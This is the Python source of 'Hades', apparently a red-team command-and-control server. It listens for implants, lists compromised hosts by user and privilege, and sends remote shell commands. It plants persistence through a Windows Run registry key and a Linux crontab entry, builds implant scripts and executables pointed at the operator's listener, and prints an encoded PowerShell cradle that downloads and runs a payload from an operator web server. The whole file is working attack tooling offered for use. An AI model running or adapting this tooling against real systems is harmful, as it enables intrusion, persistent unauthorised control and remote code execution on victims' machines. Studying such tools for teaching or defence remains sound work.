#!/usr/bin/python3 

import base64
import os
import pyfiglet
import random
import shutil
import socket
import string
import subprocess
import threading
import time
from datetime import datetime
from colorama import *
from prettytable import PrettyTable


# Banner - Move to separate config file after proj completion
def banner():
    # Clear Screen
    os.system("cls||clear")

    # Add seperator
    print(Fore.LIGHTRED_EX + "".center(80, "=") + Style.RESET_ALL)

    # Server Banner
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT)
    pyfiglet.print_figlet("Hades", font="calgphy2", justify="center")
    print(Style.RESET_ALL)

    # Credits
    print(Fore.LIGHTMAGENTA_EX + "By: Lavender-exe" + Style.RESET_ALL)
    print(Fore.LIGHTGREEN_EX + '''
Credits: "Joe Helle"
https://ko-fi.com/s/0c3776a2a0
          ''' + Style.RESET_ALL)
    print(Fore.LIGHTRED_EX + "".center(80, "=") + Style.RESET_ALL)
    print("")


# Help Menu - Move to separate config file after proj completion
def help():
    print(Fore.YELLOW + """
 /$$   /$$           /$$          
| $$  | $$          | $$          
| $$  | $$  /$$$$$$ | $$  /$$$$$$ 
| $$$$$$$$ /$$__  $$| $$ /$$__  $$
| $$__  $$| $$$$$$$$| $$| $$  \ $$
| $$  | $$| $$_____/| $$| $$  | $$
| $$  | $$|  $$$$$$$| $$| $$$$$$$/
|__/  |__/ \_______/|__/| $$____/ 
                        | $$      
                        | $$      
                        |__/      
=======================================================================================

Listener Commands
---------------------------------------------------------------------------------------

listeners -g --generate           --> Generate Listener

Session Commands
---------------------------------------------------------------------------------------

sessions -l --list                --> List Sessions
sessions -i --interact            --> Interact with Session
sessions -k --kill <value>        --> Kill Active Session

Client Commands
---------------------------------------------------------------------------------------

persist / pt                      --> Persist Payload (After Interacting with Session) 
background / bg                   --> Background Session
exit                              --> Kill Client Connection

Payload Commands
---------------------------------------------------------------------------------------

winplant.py                       --> Windows Python Implant
exeplant.py                       --> Windows Executable Implant
linplant.py                       --> Linux Implant
pshell_shell                      --> Powershell Implant

Misc Commands
---------------------------------------------------------------------------------------

help / h                          --> Show Help Menu
    """ + Style.RESET_ALL)

    # Seperator
    print(Fore.LIGHTRED_EX + "".center(80, "=") + Style.RESET_ALL)
    print("")


def comm_in(targ_id):
    print(Fore.GREEN + "[+] Waiting for Response..\n" + Style.RESET_ALL)
    response = targ_id.recv(4096).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response


def comm_out(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf-8'))
    targ_id.send(message)


def kill_sig(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf-8'))
    targ_id.send(message)


def target_comm(targ_id, targets, num):
    while True:
        message = input(Fore.YELLOW + f"{targets[num][3]}@{targets[num][1]}$ " + Style.RESET_ALL)
        comm_out(targ_id, message)

        if message == 'help' or message == 'h':
            pass
        if len(message) == 0:
            continue

        else:
            comm_out(targ_id, message)

            # Exit
            if message == 'exit':
                message = base64.b64encode(message.encode())
                targ_id.send(message)
                targ_id.close()
                # Mark client as dead in sessions list
                targets[num][7] = 'Dead'
                break

            # Commands
            if message == 'background' or message == 'bg':
                break

            if message == 'persist' or message == 'pt':
                payload_name = input(Fore.BLUE + "[i] Enter Payload Name to Persist: " + Style.RESET_ALL)
                if targets[num][6] == 1:
                    # Command 1
                    persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                    targ_id.send(persist_command_1.encode())
                    # Command 2
                    persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                    targ_id.send(persist_command_2.encode())

                    # Always keep a command to clean up endpoints after an engagement
                    print(
                        Fore.GREEN + "[+] Run this command to cleanup the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f" + Style.RESET_ALL)

                if targets[num][6] == 2:
                    persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                    targ_id.send(persist_command.encode())
                    print(Fore.GREEN + "[+] Run this command to clean up crontab: \n crontab -r" + Style.RESET_ALL)

                print(Fore.GREEN + "[+] Persistence Technique Completed" + Style.RESET_ALL)

            else:
                response = comm_in(targ_id)
                if response == 'exit':
                    print(Fore.RED + "[-] Client Connection Closed" + Style.RESET_ALL)
                    targ_id.close()
                    break

                print(response)


def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print(Fore.BLUE + '[i] Awaiting connection from client...\n' + Style.RESET_ALL)
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()


def comm_handler():
    while True:

        # If KeyboardInterrupt is issued then kill connection
        if kill_flag == 1:
            break

        try:
            remote_target, remote_ip = sock.accept()

            # Receive Username
            username = remote_target.recv(1024).decode()  # - 1
            username = base64.b64decode(username).decode()

            admin = remote_target.recv(1024).decode()  # - 2
            admin = base64.b64decode(admin).decode()

            op_sys = remote_target.recv(4096).decode()  # - 3
            op_sys = base64.b64decode(op_sys).decode()

            # Check if user is admin
            # Windows
            if admin == 1:
                admin_val = "Admin"
            # Linux    
            elif username == 'root':
                admin_val = "Root"
            # All
            else:
                admin_val = "User"

            # Operating System
            if 'Windows' in op_sys:
                pay_val = 1
            else:
                pay_val = 2

            # Time
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.day}/{date.month}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])

            # Add to table
            if host_name is not None:
                targets.append([remote_target,
                                f"{host_name[0]}@{remote_ip[0]}",  # Target
                                time_record,  # Check in
                                username,  # Username
                                admin_val,  # Check Privileges (User/Admin)
                                op_sys,  # Operating System (Windows/Linux)
                                pay_val,  # Payload Type (1 - Windows/2 - Other)
                                'Active'  # Status
                                ])

                print(Fore.GREEN +
                      f'\n[+] Connection Received from {host_name[0]}@{remote_ip}\n' +
                      Style.RESET_ALL +  # Reset Text Colour
                      Fore.YELLOW +  # Yellow Text
                      f'{host_name}@{remote_ip}' +  # Device Name@IP
                      Style.RESET_ALL, end='')

            else:
                targets.append([remote_target,
                                remote_ip[0],
                                time_record,
                                username,
                                admin_val,
                                op_sys,
                                pay_val,
                                'Active'
                                ])
                print(Fore.GREEN +
                      f'\n[+] Connection Received from {remote_ip[0]}\n' +
                      Style.RESET_ALL +
                      Fore.YELLOW +
                      f'Client@{host_ip}$ ' +
                      Style.RESET_ALL, end='')

        except:
            pass


# Windows Payloads
def winplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    check_cwd = os.getcwd()

    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print(Fore.RED + "[-] File Not Found - winplant.py" + Style.RESET_ALL)

    # Write IP to file
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)

    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()

    # Write Port to file
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)

    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()

    print(Fore.GREEN + f'[+] Payload {file_name} Created at {check_cwd}' + Style.RESET_ALL)


# Linux Payloads
def linplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    check_cwd = os.getcwd()

    if os.path.exists(f'{check_cwd}\\linplant.py'):
        shutil.copy('linplant.py', file_name)
    else:
        print(Fore.RED + "[-] File Not Found - linplant.py" + Style.RESET_ALL)

    # Write IP to file
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)

    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()

    # Write Port to file
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)

    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()

    print(Fore.GREEN + f'[+] Payload {file_name} Created at {check_cwd}' + Style.RESET_ALL)


# EXE Payloads
def exeplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    exe_file = f'{ran_name}.exe'
    check_cwd = os.getcwd()

    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print(Fore.RED + "[-] File Not Found - winplant.py" + Style.RESET_ALL)

    # Write IP to file
    with open(file_name, ) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    # Write Port to file
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()

    # Verbose File Path
    if os.path.exists(f'{file_name}'):
        print(Fore.GREEN + f"[+] {file_name} saved to {check_cwd}" + Style.RESET_ALL)
    else:
        print(Fore.RED + f"[-] Error occured during payload generation" + Style.RESET_ALL)

    # PyInstaller Command Handling
    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
    print(Fore.BLUE + f"[i] Generating Executable {exe_file}..." + Style.RESET_ALL)
    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
    os.remove(f'{ran_name}.spec')

    shutil.rmtree('build')
    if os.path.exists(f'{check_cwd}\\{exe_file}'):
        print(Fore.GREEN + f"[+] Executable Generated to Current Directory: {exe_file}" + Style.RESET_ALL)

    else:
        print(Fore.RED + f"[-] Executable Generation Failed" + Style.RESET_ALL)


# Powershell Cradle
def pshell_cradle():
    web_server_ip = input(Fore.BLUE + "[i] Web Server Listening Host: " + Style.RESET_ALL)
    web_server_port = input(Fore.BLUE + "[i] Web Server Listening Port: " + Style.RESET_ALL)
    payload_name = input(Fore.BLUE + "[i] Payload Name: " + Style.RESET_ALL)
    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    randomised_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    randomised_exe_file = f"{randomised_exe_file}.exe"
    print(Fore.BLUE + f"[i] Run this command to start a web server\npython3 -m http.server -b {web_server_ip} {web_server_port}" + Style.RESET_ALL)

    runner_cal_unencoded = f"iex (New-Object Net.WebClient).DownloadString('http://{web_server_ip}:{web_server_port}/{payload_name}')".encode('utf-16le')
    with open(runner_file, 'w') as f:
        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{randomised_exe_file} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}')
        f.close()
    b64_runner_cal = base64.b64encode(runner_cal_unencoded)
    b64_runner_cal = b64_runner_cal.decode()

    print(Fore.GREEN + f"\n[+] Encoded Payload\n\npowershell -e {b64_runner_cal}" + Style.RESET_ALL)
    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
    print(Fore.GREEN + f"\n[+] Unencoded Payload\n\n{b64_runner_cal_decoded}" + Style.RESET_ALL)


# Main Function

if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Target List Store
    targets = []
    banner()

    # Count Variables
    kill_flag = 0
    listener_counter = 0

    host_ip = ''
    host_port = 0

    while True:
        try:
            command = input(Fore.LIGHTMAGENTA_EX + f"Charon@{host_ip}$ " + Style.RESET_ALL)

            # Help Menu
            if command == 'help' or command == 'h':
                help()

            # Generate Listener Command
            if command == 'listeners -g' or command == 'listeners --generate':
                host_ip = input(Fore.BLUE + "[i] Enter Listener IP: " + Style.RESET_ALL)
                host_port = input(Fore.BLUE + "[i] Enter Listener Port: " + Style.RESET_ALL)
                listener_handler()
                listener_counter += 1

            # Payload Generation Function Calls

            # Powershell Payload
            if command == 'pshell_shell':
                pshell_cradle()

            # Windows Payload
            if command == 'winplant.py':
                if listener_counter > 0:
                    winplant()
                else:
                    print(Fore.RED + "[-] Generate Listener First" + Style.RESET_ALL)

            # Linux Payload
            if command == 'linplant.py':
                if listener_counter > 0:
                    linplant()
                else:
                    print(Fore.RED + "[-] Generate Listener First" + Style.RESET_ALL)

            # Executable Payload
            if command == 'exeplant.py':
                if listener_counter > 0:
                    exeplant()
                else:
                    print(Fore.RED + "[-] Generate Active Listener First" + Style.RESET_ALL)

            # Generate Sessions Commands
            if command.split(" ")[0] == 'sessions':
                session_counter = 0

                # List Sessions
                if command.split(" ")[1] == '-l' or command.split(" ")[1] == '--list':

                    # Define Table
                    myTable = PrettyTable()

                    # Table Headers
                    myTable.field_names = ["Session",
                                           "Status",  # 7
                                           "Username",  # 3
                                           "Privilege",  # 4
                                           "Target",  # 1
                                           "Operating System",  # 5
                                           "Check-In Time"]  # 2
                    myTable.padding_width = 3

                    # Table Rows
                    for target in targets:
                        myTable.add_row([session_counter,
                                         target[7],  # Status
                                         target[3],  # Username
                                         target[4],  # Check Privileges (User/Admin)
                                         target[1],  # Target
                                         target[5],  # Operating System
                                         target[2]])  # Check-In Time
                        session_counter += 1

                    # Print Table
                    print(myTable)

                # Interact with Session                        
                if command.split(" ")[1] == '-i' or command.split(" ")[1] == '--interact':
                    try:
                        num = int(command.split(" ")[2])
                        targ_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            target_comm(targ_id, targets, num)
                        else:
                            print(
                                Fore.RED + f"[-] The Dead Don't Talk - Cannot communicate with agent" + Style.RESET_ALL)
                    except IndexError:
                        print(Fore.RED + f"[-] Session {num} does not exist" + Style.RESET_ALL)

                # Kill Session
                if command.split(" ")[1] == '-k' or command.split(" ")[1] == '--kill':
                    try:
                        num = int(command.split(" ")[2])
                        targ_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            kill_sig(targ_id, 'exit')
                            targets[num][7] = 'Dead'
                            print(Fore.RED + f"[-] Session {num} Killed" + Style.RESET_ALL)
                        else:
                            print(Fore.RED + f"[-] Session {num} is already dead" + Style.RESET_ALL)
                    except IndexError:
                        print(Fore.RED + f"[-] Session {num} does not exist" + Style.RESET_ALL)
                    except NameError:
                        continue

            # Exit Command
            if command == 'exit':
                quit_message = input(
                    Fore.LIGHTRED_EX + "\n[!] Are you sure you want to quit? (yes/no): " + Style.RESET_ALL).lower()
                if quit_message == 'y' or quit_message == 'yes':
                    tar_length = len(targets)
                    for target in targets:
                        if target[7] == 'Dead':
                            pass
                        else:
                            comm_out(target[0], 'exit')
                    kill_flag = 1
                    if listener_counter > 0:
                        sock.close()
                    print(Fore.LIGHTRED_EX + f"Quitting..." + Style.RESET_ALL)
                    break

        except KeyboardInterrupt:
            quit_message = input(
                Fore.LIGHTRED_EX + "\n[!] Are you sure you want to quit? (yes/no): " + Style.RESET_ALL).lower()
            if quit_message == 'y' or quit_message == 'yes':
                tar_length = len(targets)
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        comm_out(target[0], 'exit')
                kill_flag = 1
                if listener_counter > 0:
                    sock.close()
                print(Fore.LIGHTRED_EX + f"Quitting..." + Style.RESET_ALL)
                break
            else:
                continue
